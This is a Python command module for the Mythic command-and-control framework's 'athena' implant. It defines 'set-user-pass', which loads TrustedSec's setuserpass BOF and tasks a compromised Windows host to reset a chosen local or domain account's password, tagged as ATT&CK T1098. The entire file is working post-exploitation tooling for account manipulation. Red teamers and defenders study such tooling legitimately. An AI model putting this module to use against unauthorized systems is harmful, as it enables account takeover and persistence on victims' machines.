from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import binascii
import cmd 
import struct
import os
import subprocess
from ..athena_utils.bof_utilities import *

class SetUserPassArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Required. The target username.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                description="Required. The new password. The password must meet GPO requirements",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                description="Optional. The domain/computer for the account. You must give the domain name for the user if it is a domain account.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=False,
                        )
                    ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            raise ValueError("Missing arguments")
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)
    

class SetUserPassCommand(CoffCommandBase):
    cmd = "set-user-pass"
    needs_admin = False
    help_cmd = """
Summary: Sets the password for the specified user account on the target computer. 
Usage:   set-user-pass -username checkymander -password P@ssw0rd! -domain METEOR
         username  Required. The user name to activate/enable. 
         password  Required. The new password. The password must meet GPO 
                   requirements.
         domain    Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account.

Credit: The TrustedSec team for the original BOF. - https://github.com/trustedsec/CS-Remote-OPs-BOF
    """
    description = "Sets the password for the specified user account on the target computer. "
    version = 1
    script_only = True
    supported_ui_features = []
    author = "@TrustedSec"
    argument_class = SetUserPassArguments
    attackmapping = ["T1098"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        arch = taskData.Callback.Architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        bof_path = os.path.join(self.agent_code_path, "../")
        bof_path = f"/Mythic/athena/mythic/agent_functions/trusted_sec_remote_bofs/setuserpass/setuserpass.{arch}.o"
        if(os.path.isfile(bof_path) == False):
            await compile_bof("/Mythic/athena/mythic/agent_functions/trusted_sec_remote_bofs/setuserpass/")

        # Read the COFF file from the proper directory
        with open(bof_path, "rb") as f:
            coff_file = f.read()

        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                taskData.Task.ID,
                DeleteAfterFetch = True,
                FileContents = coff_file,
            ))
        
        encoded_args = ""
        OfArgs = []
        domain = taskData.args.get_arg("domain")
        if domain:
            OfArgs.append(generateWString(domain))
        else:
            OfArgs.append(generateWString("")) # if no domain is specified, just pass an empty string to represent localhost

        username = taskData.args.get_arg("username")
        OfArgs.append(generateWString(username))
        password = taskData.args.get_arg("password")
        OfArgs.append(generateWString(password))


        encoded_args = base64.b64encode(SerializeArgs(OfArgs)).decode()

        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID, 
            CommandName="coff",
            SubtaskCallbackFunction="coff_completion_callback",
            Params=json.dumps({
                "coffFile": file_resp.AgentFileId,
                "functionName": "go",
                "arguments": encoded_args,
                "timeout": "60",
            }),
            Token=taskData.Task.TokenID,
        ))

        # We did it!
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
